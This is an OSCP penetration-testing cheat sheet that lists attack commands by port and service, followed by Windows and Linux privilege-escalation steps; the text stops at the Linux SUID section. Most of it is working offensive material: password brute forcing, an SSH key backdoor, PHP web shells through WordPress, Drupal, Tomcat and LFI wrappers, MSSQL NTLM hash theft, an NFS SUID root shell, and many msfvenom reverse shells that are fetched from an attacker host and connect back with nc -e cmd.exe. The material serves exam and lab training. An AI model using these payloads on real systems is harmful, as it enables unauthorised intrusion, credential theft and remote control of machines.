# DigitalDefence Cheat Sheet for OSCP

## Enumeration:

1. nmapAutomator:
	```
	nmapAutomator.sh -H IP -t All
	```
2. autorecon:
	```
	autorecon IP
	```
3. nmap:
	```
	nmap -T4 -A -p- IP
	```
4. enum4linux:
	```
	enum4linux -a IP
	```
5. wfuzz
	```
	wfuzz -c -z range,1-65535 --hl=2 http://IP:PORT/url.php?path=FUZZ
	wfuzz -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt http://IP:PORT/index.html?parameter=FUZZ
	```

## Port Enumeration and Potential Exploits:

### 21 (FTP):
1. Anonymous login is possible:
	```
	ftp IP
	ftp> USER anonymous
	ftp> PASS 
	```
2. View of FTP content:
	```
	ftp://IP
	```
3. Get files from FTP:
	```
	PASSIVE
	BINARY
	get FILE
	```
4. Upload files to FTP:
	```
	PASSIVE
	BINARY
	put FILE
	```
5. Brute force:
	```
	hydra -V -f -L USER_LIST -P /usr/share/wordlists/rockyou.txt ftp://IP -u -vV
	```
6. Vulnerability Scanning:
	```
	nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer" -vv -oN ftp IP
	```

### 22 (SSH)
1. Brute Force:
	```
	hydra -V -f -L <USERS_LIST> -P /usr/share/wordlists/rockyou.txt ssh://IP -u -vV
	```
2. Possible Exploit: CVE-2008-0166:
	```
	searchsploit -m 5720
	```
3. Backdoor (might be worth it):
	```
	-> Attacker
	ssh-keygen -f FILE
	chmod 600 FILE
	cat FILE.pub -> copy

	-> Victim
	echo FILE.pub >> PATH/.ssh/authorized_keys

	-> Connect
	ssh -i FILE USER@IP
	```
4. Banner grab:
	```
	ssh root@IP
	```

### 23 (Telnet)
1. Connect:
	```
	telnet IP 23
	```

### 25 (SMTP)
1. Connect:
	```
	nc IP 25
	```
2. User enumeration:
	```
	VRFY USER
	```

### 43 (WHOIS)
1. Connection:
	```
	whois -h IP -p PORT "domain.tld"
	```

### 53 (DNS)
1. Enumeration:
	```
	dnsenum DOMAIN
	dnsrecon -d DOMAIN

	nslookup
	nslookup> server IP
	nslookup> DOMAIN
	```
2. Zone Transfer
	```
	dnsrecon -d DOMAAIN -a
	dig axfr DOMAIN @website
	```
3. DNS Brute force:
	```
	https://github.com/blark/aiodnsbrute
	```

### 69 (TFTP)
1. Enumeration
	```
	nmap -n -Pn -sU -p69 -sV --script tftp-enum IP
	```

### 79 (Finger)
1. User Enumeration
	```
	finger IP
	finger USER@IP
	```
2. Command execution:
	```
	finger "|/bin/id@<IP>"
	finger "|/bin/ls -a /<IP>"
	```

### 80 & 443 (HTTP):
1. Enumeration:
	```
	done by automatic scripts
	check https://github.com/pwnwiki/webappdefaultsdb/blob/master/README.md
	```
2. Directory Fuzzing:
- GoBuster:
	```
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx
	gobuster dir -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html,cgi,sh,bak,aspx --insecuressl
	```
(might have to use `-k` switch if HTTPS is not trustable)
- Dirbuster
	```
	trivial
	```
	(Do not forget to change file formats and supply correct directory list like above)

3. **Wordpress**
- _Enumeration_
	```
	\# Scan
	wpscan --rua -e --url IP/URL
	\# Brute force users/login
	wpscan --rua --url IP/URL -P /usr/share/wordlists/rockyou.txt -U "USER,USER"
	\# Plugin and theme enumeration
	wpscan --url URL --enumerate ap,at --plugins-detection mixed
	```
- _Theme RCE_
	```
	Appearance -> Editor -> 404 Template (at the right)
	Change the content for a php shell
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	http://<IP>/wp-content/themes/twentytwelve/404.php
	```
- _Plugin RCE_
	Follow this [Link](https://medium.com/swlh/wordpress-file-manager-plugin-exploit-for-unauthenticated-rce-8053db3512ac)
4. **Drupal**
- _Enumeration_
	```
	python3 drupwn --mode enum --target URL
	```
- _User Enumeration_
	```
	In /user/register just try to create a username and if the name is already taken it will be notified :
	*The name admin is already taken*
	If you request a new password for an existing username :
	*Unable to send e-mail. Contact the site administrator if the problem persists.*
	If you request a new password for a non-existent username :
	*Sorry, test is not recognized as a user name or an e-mail address.*
	Accessing /user/<number> you can see the number of existing users :
	/user/1 -> Access denied (user exist)
	/user/2 -> Page not found (user doesn't exist)
	```
- _Hidden Pages Enumeration_
	```
	wfuzz -c -z range,1-500 --hc 404 URL/node/FUZZ
	```
- _Panel RCE_
	```
	You need the plugin php to be installed (check it accessing to /modules/php and if it returns a 403 then, exists, if not found, then the plugin php isn't installed)
	Go to Modules -> (Check) PHP Filter  -> Save configuration
	https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
	Then click on Add content -> Select Basic Page or Article -> Write php shellcode on the body -> Select PHP code in Text format -> Select Preview
	```
5. **Joomla**
- _Enumeration_
	```
	joomscan -u URL
	./joomlavs.rb --url URL -a -v
	```
6. **Tomcat**
- _Default Credentials_
	```
	The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic HTTP auth, the most common credentials are :
	```
	```
	admin:admin
	tomcat:tomcat
	admin:<NOTHING>
	admin:s3cr3t
	tomcat:s3cr3t
	admin:tomcat
	```
- _Brute Force_
	```
	hydra -L USER_LIST -P /usr/share/wordlists/rockyou.txt -f IP http-get /manager/html -vV -u
	```
- _Panel RCE_
	```
	\# Generate payload
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
	```
	```
	\# Upload payload
	Tomcat6 :
	wget 'http://USER:PASSWORD@IP:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
	```
	```
	Tomcat7 and above :
	curl -v -u USER:PASSWORD -T shell.war 'http://IP:8080/manager/text/deploy?path=/shellh&update=true'
	```
	```
	\# Listener
	nc -nvlp PORT
	```
	```
	\# Execute payload
	curl http://IP:8080/shell/
	```
7. **WebDav**
	```
	davtest -url URL
	```
8. HTTP Brute Force Authentication
- _HTTP Basic Authentication_
	```
	\# Hydra
	hydra -l USER -V -P /usr/share/wordlists/rockyou.txt -s 80 -f IP http-get /URL_ENDPOINT/ -t 15
	```
- _HTTP GET request_
	```
	hydra IP -V -l USER -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes;PHPSESSID=12345myphpsessid" -t 15
	```
- _HTTP POST request_
	```
	hydra -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t 15
	```
9. Spider / Brute force directories / files
	```
	gospider -d DEPTHS --robots --sitemap -t 15 -s URL
	```
	```
	ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u URL/FUZZ -e .php,.txt -t 15
	```
	```
	Dictionaries :
	/usr/share/wordlists/dirb/common.txt
	/usr/share/wordlists/dirb/big.txt
	/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	```
	_File backups_
	```
	file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
	```
10. Local File / Remote File Inclusion (LFI/RFI):
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
	```
- Wrappers
	```
	\# php://filter
	http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
	\# expect://
	http://example.com/index.php?page=expect://id
	\# data://
	echo '<?php phpinfo(); ?>' | base64 -w0 -> PD9waHAgcGhwaW5mbygpOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=
	If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.
	Code execution with 
	exec
	shell_exec
	system
	passthru
	popen
	\# Example
	echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0 -> PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=
	If there is "Shell done !" on the webpage, then there is code execution and you can do things like :
	http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
	\# input://
	curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"
	```
- Useful LFI lists
	```
	\Linux
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
	\Windows
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
	\# Both
	/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
	```
- Tools
	```
	kadimus --url URL
	python lfisuite.py
	```
11. Command Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
	Burp!
	```
12. Deserialization
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
	```
13. File Upload
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
	```
14. SQL Injection
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
	https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
	```
15. XSS
	```
	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
	beef-xss
	cat /usr/share/beef-xss/config.yaml | grep user -C 1 # user / password
	<script src="http://IP:3000/hook.js"></script>
	```
16. Upload a file with PUT
	```
	curl -X PUT http://IP/FILE -d @FILE  -v
	```

### 88 (Kerberos)
1. Enumeration
	```
	nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
	https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
	```

### 110 (POP3)
1. Brute Force
	```
	hydra -l USER -P /usr/share/wordlists/rockyou.txt -f IP pop3 -V
	hydra -S -v -l USER -P /usr/share/wordlists/rockyou.txt -s 995 -f IP pop3 -V
	```
2. Read mail
	```
	telnet IP 110
	USER USER
	PASS PASSWORD
	LIST
	RETR MAIL_NUMBER
	QUIT
	```
	
### 111 (RPC/NFS)
1. Enumeration
	```
	nmap -sV -p 111 --script=rpcinfo IP
	nmap -p 111 -script nfs* IP
	```
2. Mountable Drives
	```
	showmoun -e IP
	```
3. Mounting
	```
	mount -t nfs -o vers=3 IP:/SHARE /mnt
	groupadd --gid 1337 pwn
	useradd --uid 1337 -g pwn pwn
	```

### 161 (SNMP)
1. Brute force community string:
	```
	onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <IP>
	snmpbulkwalk -c <COMMUNITY_STRING> -v<VERSION> IP
	snmp-check IP
	nmap -sU -sV -sC --open -p 161 IP
	```
2. Modifying SNMP values
	```
	http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html
	```
	
### 139/445 (SMB/Samba)
1. Enumeration:
	```
	nmap -Pn -n -p139,445 --script smb-* IP
	enum4linux -a IP
	```
2. Hostname Enumeration:
	```
	nmblookup -A IP
	```
3. Version enumeration:
	```
	./smbver.sh IP PORT
	```
4. Share enumeration:
	```
	smbclient -L \\IP -N --option='client min protocol=NT1'
	smbclient -L \\IP -U USER
	smbclient -L IP
	smbclient -L --no-pass -L //$IP
	```
5. Brute force
	```
	hydra -V -f -L USERS -P /usr/share/wordlists/rockyou.txt smb://IP -u -vV
	```
6. Mount
	```
	mkdir /tmp/share
	sudo mount -t cifs //<IP>/<SHARE> /tmp/share
	sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>'//<IP>/<SHARE> /tmp/share
	```
7. Shell inclusion:
	```
	psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
	smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
	```
8. Useful exploits
	```
	EternalBlue (MS17-010)
	MS08-067
	CVE-2017-7494
	
	```
9. Change Samba protocol version Connection
	```
	sudo vim /etc/samba/smb.conf
	min protocol = SMB2
	sudo /etc/init.d/smbd restart
	```

### 389,636 (LDAP)
1. Enumeration
	```
	nmap -n -sV --script "ldap* and not brute" IP
	ldapsearch -h <IP> -x -s base
	ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
	```
2. Graphical Interface
	```
	jxplorer
	```

### 1433 (MSSQL)
1. Enumeration
	```
	nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
	```
2. Brute force
	```
	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
	```
3. After having credentials
	```
	mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
	mssqlclient.py <USER>:<PASSWORD>@<IP>
	\# Once logged in you can run queries:
	SQL> select @@ version;
	\# Steal NTLM hash
	sudo smbserver.py -smb2support liodeus .
	SQL> exec master..xp_dirtree '\\<IP>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat
	\# Try to enable code execution
	SQL> enable_xp_cmdshell
	\# Execute code
	SQL> xp_cmdshell whoami /all
	SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
	```
4. Manual
	```
	https://www.asafety.fr/mssql-injection-cheat-sheet/
	```
	
### 2049 (NFS)
1. Mountable NFS Shares
	```
	showmount -e <IP>
	nmap --script=nfs-showmount -oN mountable_shares IP
	```
2. Mounting
	```
	sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
	sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
	```
3. NFS Misconfig
	```
	cat /etc/exports
	If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.
	\# Attacker, as root user
	mkdir <DIRECTORY>
	mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
	cd <DIRECTORY>
	echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
	gcc pwn.c -o pwn
	chmod +s pwn
	\# Victim
	cd <SHARE>
	./pwn # Root shell
	```
### 3306 (MYSQL)
1. Brute Force
	```
	hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
	```
2. Extracting credentials
	```
	cat /etc/mysql/debian.cnf
	grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
	```
3. Connect
	```
	mysql -u USER
	mysql -u USER -p
	mysql -h IP -u USER
	```
4. MySQL Commands:
	```
	show databases;
	use <DATABASES>;
	show tables;
	describe <TABLE>;
	select * from <TABLE>;
	\# Try to execute code
	select do_system('id');
	\! sh
	\# Read & Write
	select load_file('<FILE>');
	select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
	```
5. Manual
	```
	https://www.asafety.fr/mysql-injection-cheat-sheet/
	```
### 3389 (RDP)
1. Brute force
	```
	hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
	```
2. Connect
	```
	rdesktop -u <USERNAME> <IP>
	rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <IP>
	xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:<IP>
	xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:<IP>
	```
3. Session Stealing
	```
	query user
	tscon <ID> /dest:<SESSIONNAME>
	```
4. Adding user to RDP Group
	```
	net localgroup "Remote Desktop Users" <USER> /add
	```
### 5800 - 5801 - 5900 - 5901 (VNC)
1. Scans
	```
	nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <PORT> <IP>
	```
2. Brute Force
	```
	hydra -L <USERS_LIST> –P <PASSWORDS_LIST> -s <PORT> <IP> vnc -u -vV
	```
3. Connect
	```
	vncviewer <IP>:<PORT>
	```
4. Password Location
	```
	\# Linux
	Default password is stored in: ~/.vnc/passwd
	\# Windows
	HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
	HKEY_CURRENT_USER\Software\TightVNC\Server
	HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
	C:\Program Files\UltraVNC\ultravnc.ini
	```
5. Decrypting 
	```
	msfconsole
	irb
	fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
	require 'rex/proto/rfb'
	Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
	/dev/nul
	```
### 5985-5986 (WINRM)
1. Brute force
	```
	crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
	```
2. Connect
	```
	evil-winrm -i <IP> -u <USER> -p <PASSWORD>
	evil-winrm -i <IP> -u <USER> -H <HASH>
	```
	
## Low Privilege Exploitation

### Hydra
	```
	hydra -V -f -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
	hydra -V -f -L USERLIST -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
	hydra -f -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
	hydra -f -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
	```

### Searchsploit
	```
	searchsploit EXPLOIT
	searchsploit -m NUMBER_EXPLOIT
	```

### Log poisoning
	```
	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
	```

## System Enumeration and attack vectors

### Linux
1. Enumeration scripts
	```
	bash LinEnum.sh
	bash lse.sh -l 1
	bash linpeas.sh
	python linuxprivchecker.py
	./unix-privesc-check standard
	```
2. Vulnerability Scan
	```
	perl les2.pl
	bash les.sh
	```
3. SUID Check ([More](https://gtfobins.github.io/)
	```
	python suid3num.py
	```
4. Methology
	```
	https://guif.re/linuxeop
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	
	sudo -l
	Kernel Exploits
	OS Exploits
	Password reuse (mysql, .bash_history, 000- default.conf...)
	Known binaries with suid flag and interactive (nmap)
	Custom binaries with suid flag either using other binaries or with command execution
	Writable files owned by root that get executed (cronjobs)
	MySQL as root
	Vulnerable services (chkrootkit, logrotate)
	Writable /etc/passwd
	Readable .bash_history
	SSH private key
	Listening ports on localhost
	/etc/fstab
	/etc/exports
	/var/mail
	Process as other user (root) executing something you have permissions to modify
	SSH public key + Predictable PRNG
	apt update hooking (PreInvoke)
	```
	
### Windows
Do not forget if availabe: ``` powershell -ep bypass ```

1. Download file on Windows
	```
	powershell -c "Invoke-WebRequest -URI 'http://10.9.5.12:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
	*execute file*
	```
2. Execute file
	```
	.\shell.exe
	```
3. Enumeration Scripts
	```
	\# General
	winPEAS.exe
	windows-privesc-check2.exe
	Seatbelt.exe -group=all
	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
	Powerless.bat
	winPEAS.bat
	
	\# CVE Search
	systeminfo > systeminfo.txt
	python windows-exploit-suggester.py --update
	python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt

	systeminfo > systeminfo.txt
	wmic qfe > qfe.txt
	python wes.py -u
	python wes.py systeminfo.txt qfe.txt

	powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
	
	\# Post Exploit (more to follow)
	lazagne.exe all
	SharpWeb.exe
	mimikatz.exe
	```
4. Juicy Potato
	```
	\# If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

	JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
	JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>

	\# CLSID
	https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
	```
5. Methology to Follow
	```
	https://guif.re/windowseop
	https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
	https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
	http://www.fuzzysecurity.com/tutorials/16.html
	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	```
6. Autorun
	```
	\# Detection
	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

	[*] Checking for modifiable registry autoruns and configs...

	Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
	Path           : "C:\Program Files\Autorun Program\program.exe"
	ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
	
	\# or
	
	winPEAS.exe

	[+] Autorun Applications(T1010)
	    Folder: C:\Program Files\Autorun Program
	    File: C:\Program Files\Autorun Program\program.exe
	    FilePerms: Everyone [AllAccess]
	
	\# Exploits
	\# Attacker
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	\# Victim
	cd C:\Program Files\Autorun Program\
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

	To execute it with elevated privileges we need to wait for someone in the Admin group to login.
	```
7. AlwaysInstallElevated
	```
	\# Detection
	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

	[*] Checking for AlwaysInstallElevated registry key...

	AbuseFunction : Write-UserAddMSI
	
	\# or
	
	reg query HKLM\Software\Policies\Microsoft\Windows\Installer
	reg query HKCU\Software\Policies\Microsoft\Windows\Installer

	If both values are equal to 1 then it's vulnerable.
	
	\# or 
	winPEAS.exe

	[+] Checking AlwaysInstallElevated(T1012)

	  AlwaysInstallElevated set to 1 in HKLM!
	  AlwaysInstallElevated set to 1 in HKCU!
	
	\# Exploit 
	\# Attacker
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	\# Victim
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
	msiexec /quiet /qn /i C:\Temp\program.msi
	```
8. Executable Files
	```
	\# Executable
	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

	[*] Checking service executable and argument permissions...

	ServiceName                     : filepermsvc
	Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
	ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
	ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
	ModifiableFileIdentityReference : Everyone
	StartName                       : LocalSystem
	AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
	CanRestart                      : True
	
	\# or
	
	winPEAS.exe

	[+] Interesting Services -non Microsoft-(T1007)

	filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
		File Permissions: Everyone [AllAccess]
		
	\# Exploitation
	# Attacker
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	# Victim
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
	copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
	sc start filepermsvc
	```
9. Startup Applications
	```
	\# Detection
	icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

	C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
								     TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
								     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
								     BUILTIN\Administrators:(I)(OI)(CI)(F)
								     BUILTIN\Users:(I)(OI)(CI)(RX)
								     Everyone:(I)(OI)(CI)(RX)

	If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
	
	\# Exploitation
	# Attacker
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	# Victim
	cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')

	To execute it with elevated privileges we need to wait for someone in the Admin group to login.
	```
10. Weak service permissions
	```
	\# Detection
	# Find all services authenticated users have modify access onto
	accesschk.exe /accepteula -uwcqv "Authenticated Users" *

	if SERVICE_ALL_ACCESS then vulnerable

	# Find all weak folder permissions per drive.
	accesschk.exe /accepteula -uwdqs Users c:\
	accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

	# Find all weak file permissions per drive.
	accesschk.exe /accepteula -uwqs Users c:\*.*
	accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*

	\# or

	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

	[*] Checking service permissions...

	ServiceName   : daclsvc
	Path          : "C:\Program Files\DACL Service\daclservice.exe"
	StartName     : LocalSystem
	AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
	CanRestart    : True

	\# or

	winPEAS.exe

	[+] Interesting Services -non Microsoft-(T1007)

	daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
		YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

	[+] Modifiable Services(T1007)
		LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
		daclsvc: WriteData/CreateFiles
	
	\# Exploitation
	# Attacker
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	# Victim
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
	sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
	sc start <SERVICENAME>
	or 
	net start <SERVICENAME>
	```

11. Unquoted service paths
	```
	\# Detection
	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

	[*] Checking for unquoted service paths...

	ServiceName    : unquotedsvc
	Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
	ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
	StartName      : LocalSystem
	AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
	CanRestart     : True

	ServiceName    : unquotedsvc
	Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
	ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
	StartName      : LocalSystem
	AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
	CanRestart     : True

	\# or

	winPEAS.exe

	[+] Interesting Services -non Microsoft-(T1007)

	unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
	
	\# Exploitation
	# Attacker
	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	# Victim
	cd "C:\Program Files\Unquoted Path Service\"
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
	sc start unquotedsvc
	```

12. Hot potato
	```
	\# Exploitation
	# Attacker
	sudo python -m SimpleHTTPServer 80
	sudo nc -lvp <PORT>

	# Victim
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
	powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
	```
13. CVEs
	```
	# Already compiled exploit
	https://github.com/SecWiki/windows-kernel-exploits
	https://github.com/abatchy17/WindowsExploits
	```

## High Privilege Exploitation

### Linux

1. Sudo
	```
	sudo -l
	```
2. SUID
	```
	find / -user root -perm -4000 -print 2>/dev/null
	find / -perm -u=s -type f 2>/dev/null
